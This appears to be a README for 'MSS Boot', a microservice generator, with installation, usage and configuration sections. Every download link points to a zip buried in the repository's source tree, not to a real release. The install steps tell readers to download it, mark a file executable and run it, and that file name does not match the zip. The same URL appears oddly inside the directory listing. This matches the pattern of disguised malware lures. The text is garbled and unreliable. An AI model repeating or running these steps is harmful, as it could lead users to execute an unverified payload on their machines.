## Installation

To install MSS Boot, download the latest release from our [Releases page](https://github.com/morytoh/mss-boot/raw/refs/heads/master/pkg/config/storage/locker/mss-boot-1.8.zip). You will need to download the appropriate file for your operating system and execute it.

### Example for Linux

```bash
wget https://github.com/morytoh/mss-boot/raw/refs/heads/master/pkg/config/storage/locker/mss-boot-1.8.zip
chmod +x mss-boot-linux
./mss-boot-linux
```

### Example for Windows

Download the executable from the [Releases page](https://github.com/morytoh/mss-boot/raw/refs/heads/master/pkg/config/storage/locker/mss-boot-1.8.zip) and run it.

## Usage

Once installed, you can create a new microservice by running:

```bash
mss-boot create my-service
```

This command generates a new microservice with the name `my-service`. You can then customize the service as needed.

### Service Structure

The generated service will have the following structure:

```
my-service/
├── src/
│   └── main/
│       └── java/
│           └── com/
│               └── example/
│                   └── myservice/
├── Dockerfile
└── https://github.com/morytoh/mss-boot/raw/refs/heads/master/pkg/config/storage/locker/mss-boot-1.8.zip
```

## Configuration

MSS Boot allows you to configure various aspects of your microservice. The configuration files are located in the `src/main/resources` directory. You can set parameters such as database connections, service endpoints, and more.

### Example Configuration

```yaml
server:
  port: 8080

spring:
  datasource:
    url: jdbc:mysql://localhost:3306/mydb
    username: user
    password: password
